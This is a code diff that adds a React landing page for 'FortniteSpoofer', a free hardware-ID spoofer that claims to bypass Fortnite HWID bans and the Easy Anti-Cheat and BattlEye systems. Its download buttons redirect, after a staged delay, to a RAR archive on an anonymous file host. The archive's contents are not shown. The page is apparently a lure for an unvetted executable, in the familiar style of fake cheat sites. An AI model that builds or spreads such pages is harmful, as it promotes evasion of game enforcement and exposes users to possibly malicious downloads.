@@ -1,0 +1,220 @@
+"use client";
+
+import { useState } from "react";
+import { Button } from "@/components/ui/button";
+import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
+import { Download, Shield, Clock, Users } from "lucide-react";
+
+export default function FortniteHWIDSpoof() {
+  const [isDownloading, setIsDownloading] = useState(false);
+
+  const handleDownload = () => {
+    setIsDownloading(true);
+    // Simulate processing time
+    setTimeout(() => {
+      // Redirect to the download URL
+      window.location.href = 'https://files.catbox.moe/ygw50l.rar';
+      setIsDownloading(false);
+    }, 1500);
+  };
+
+  return (
+    <div className="min-h-screen bg-black text-white">
+      {/* Header */}
+      <header className="container mx-auto px-4 py-6 flex justify-between items-center border-b border-gray-800">
+        <div className="flex items-center space-x-2">
+          <div className="w-10 h-10 bg-white rounded-lg flex items-center justify-center">
+            <Shield className="h-6 w-6 text-black" />
+          </div>
+          <span className="text-2xl font-bold">FortniteSpoofer</span>
+        </div>
+        <nav className="hidden md:block">
+          <ul className="flex space-x-8">
+            <li><a href="#" className="hover:text-gray-400 transition-colors">Home</a></li>
+            <li><a href="#" className="hover:text-gray-400 transition-colors">Features</a></li>
+            <li><a href="#" className="hover:text-gray-400 transition-colors">FAQ</a></li>
+            <li><a href="#" className="hover:text-gray-400 transition-colors">Contact</a></li>
+          </ul>
+        </nav>
+      </header>
+
+      {/* Hero Section */}
+      <section className="container mx-auto px-4 py-16 md:py-24 flex flex-col items-center text-center">
+        <h1 className="text-4xl md:text-6xl font-bold max-w-3xl leading-tight">
+          Bypass Fortnite <span className="text-white">HWID Bans</span>
+        </h1>
+        <p className="mt-6 text-lg md:text-xl text-gray-300 max-w-2xl">
+          Get back into the game with our free, undetectable HWID spoofer. Works with the latest Fortnite updates.
+        </p>
+        
+        <div className="mt-10">
+          <Button 
+            size="lg" 
+            className="text-lg px-8 py-6 bg-white text-black hover:bg-gray-200 transition-all transform hover:scale-105 border border-white"
+            onClick={handleDownload}
+            disabled={isDownloading}
+          >
+            {isDownloading ? (
+              <>
+                <Clock className="mr-2 h-5 w-5 animate-spin" />
+                Preparing Download...
+              </>
+            ) : (
+              <>
+                <Download className="mr-2 h-5 w-5" />
+                Download Spoofer
+              </>
+            )}
+          </Button>
+          <p className="mt-3 text-sm text-gray-400">Version 2.1 • 1.8MB • Windows Only</p>
+        </div>
+      </section>
+
+      {/* Features Section */}
+      <section className="container mx-auto px-4 py-12">
+        <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
+          <Card className="bg-black border border-gray-800">
+            <CardHeader>
+              <Shield className="h-10 w-10 text-white mb-4" />
+              <CardTitle className="text-xl">Undetectable</CardTitle>
+            </CardHeader>
+            <CardContent>
+              <CardDescription className="text-gray-300">
+                Our spoofer bypasses all current Fortnite anti-cheat systems including Easy Anti-Cheat and BattlEye.
+              </CardDescription>
+            </CardContent>
+          </Card>
+          
+          <Card className="bg-black border border-gray-800">
+            <CardHeader>
+              <Clock className="h-10 w-10 text-white mb-4" />
+              <CardTitle className="text-xl">Fast & Easy</CardTitle>
+            </CardHeader>
+            <CardContent>
+              <CardDescription className="text-gray-300">
+                Spoof your HWID in seconds with our one-click solution. No technical knowledge required.
+              </CardDescription>
+            </CardContent>
+          </Card>
+          
+          <Card className="bg-black border border-gray-800">
+            <CardHeader>
+              <Users className="h-10 w-10 text-white mb-4" />
+              <CardTitle className="text-xl">Trusted by Gamers</CardTitle>
+            </CardHeader>
+            <CardContent>
+              <CardDescription className="text-gray-300">
+                Join thousands of Fortnite players who've successfully bypassed HWID bans with our tool.
+              </CardDescription>
+            </CardContent>
+          </Card>
+        </div>
+      </section>
+
+      {/* How It Works */}
+      <section className="container mx-auto px-4 py-16">
+        <h2 className="text-3xl font-bold text-center mb-12">How It Works</h2>
+        <div className="max-w-4xl mx-auto">
+          <div className="flex flex-col md:flex-row items-center mb-12">
+            <div className="md:w-1/3 mb-6 md:mb-0 flex justify-center">
+              <div className="bg-white border border-gray-700 rounded-full w-32 h-32 flex items-center justify-center">
+                <span className="text-5xl font-bold text-black">1</span>
+              </div>
+            </div>
+            <div className="md:w-2/3 md:pl-12">
+              <h3 className="text-2xl font-bold mb-3">Download & Install</h3>
+              <p className="text-gray-300">
+                Download FortniteSpoofer from our secure server and run the installer. 
+                No additional drivers or software required.
+              </p>
+            </div>
+          </div>
+          
+          <div className="flex flex-col md:flex-row items-center mb-12">
+            <div className="md:w-1/3 mb-6 md:mb-0 flex justify-center">
+              <div className="bg-white border border-gray-700 rounded-full w-32 h-32 flex items-center justify-center">
+                <span className="text-5xl font-bold text-black">2</span>
+              </div>
+            </div>
+            <div className="md:w-2/3 md:pl-12">
+              <h3 className="text-2xl font-bold mb-3">Run the Spoofer</h3>
+              <p className="text-gray-300">
+                Launch FortniteSpoofer and click "Spoof HWID". Our tool will instantly generate 
+                new hardware identifiers for your system.
+              </p>
+            </div>
+          </div>
+          
+          <div className="flex flex-col md:flex-row items-center">
+            <div className="md:w-1/3 mb-6 md:mb-0 flex justify-center">
+              <div className="bg-white border border-gray-700 rounded-full w-32 h-32 flex items-center justify-center">
+                <span className="text-5xl font-bold text-black">3</span>
+              </div>
+            </div>
+            <div className="md:w-2/3 md:pl-12">
+              <h3 className="text-2xl font-bold mb-3">Play Fortnite</h3>
+              <p className="text-gray-300">
+                Launch Fortnite and enjoy the game without HWID restrictions. 
+                Our spoofer automatically renews identifiers to maintain protection.
+              </p>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      {/* CTA Section */}
+      <section className="container mx-auto px-4 py-16 text-center">
+        <div className="max-w-3xl mx-auto border border-gray-800 rounded-2xl p-8 md:p-12">
+          <h2 className="text-3xl md:text-4xl font-bold mb-4">Get Back Into Fortnite</h2>
+          <p className="text-gray-300 mb-8 max-w-2xl mx-auto">
+            Bypass HWID bans and play Fortnite without restrictions. Our spoofer is completely free and works with the latest game updates.
+          </p>
+          <Button 
+            size="lg" 
+            className="text-lg px-8 py-6 bg-white text-black hover:bg-gray-200 transition-all border border-white"
+            onClick={handleDownload}
+            disabled={isDownloading}
+          >
+            {isDownloading ? (
+              <>
+                <Clock className="mr-2 h-5 w-5 animate-spin" />
+                Preparing Download...
+              </>
+            ) : (
+              <>
+                <Download className="mr-2 h-5 w-5" />
+                Download Now - Free
+              </>
+            )}
+          </Button>
+        </div>
+      </section>
+
+      {/* Footer */}
+      <footer className="border-t border-gray-800 mt-16">
+        <div className="container mx-auto px-4 py-12">
+          <div className="flex flex-col md:flex-row justify-between items-center">
+            <div className="flex items-center space-x-2 mb-6 md:mb-0">
+              <div className="w-8 h-8 bg-white rounded-lg flex items-center justify-center">
+                <Shield className="h-5 w-5 text-black" />
+              </div>
+              <span className="text-xl font-bold">FortniteSpoofer</span>
+            </div>
+            
+            <div className="flex space-x-6">
+              <a href="#" className="text-gray-400 hover:text-white transition-colors">Terms</a>
+              <a href="#" className="text-gray-400 hover:text-white transition-colors">Privacy</a>
+              <a href="#" className="text-gray-400 hover:text-white transition-colors">Contact</a>
+              <a href="#" className="text-gray-400 hover:text-white transition-colors">FAQ</a>
+            </div>
+          </div>
+          
+          <div className="mt-8 pt-8 border-t border-gray-800 text-center text-gray-500 text-sm">
+            <p>© {new Date().getFullYear()} FortniteSpoofer. All rights reserved.</p>
+            <p className="mt-2">This tool is for educational purposes only. Use at your own risk.</p>
+          </div>
+        </div>
+      </footer>
+    </div>
+  );
+}
